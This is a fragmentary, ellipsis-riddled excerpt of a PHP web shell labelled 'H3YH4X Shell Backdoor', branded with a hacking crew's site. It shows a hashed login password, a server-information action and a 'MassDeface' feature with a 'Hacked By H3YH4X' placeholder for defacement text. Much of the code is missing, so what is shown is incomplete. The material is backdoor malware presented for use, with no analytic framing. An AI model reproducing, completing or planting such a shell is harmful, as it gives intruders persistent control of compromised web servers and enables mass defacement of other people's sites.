...
$password 			= "4f58b9c8f953b2a124d6af21eb097182";   // H*YH*X
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='author' content='Recode | H3YH4X'/>
    ...
    <title>H3YH4X Shell Backdoor</title>
    <style>
    	body{
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">H3YH4X</h2><hr>
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://22xploitercrew.com">H3YH4X</a></small>
    	</center>
    </div>
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://www.22xploitercrew.com'>[ ! ] H3YH4X [ ! ]</h1>
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Hacked By H3YH4X'></textarea><br/>
...
if($ext == "php") {
		...
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">H3YH4X</a></small></center>';
?>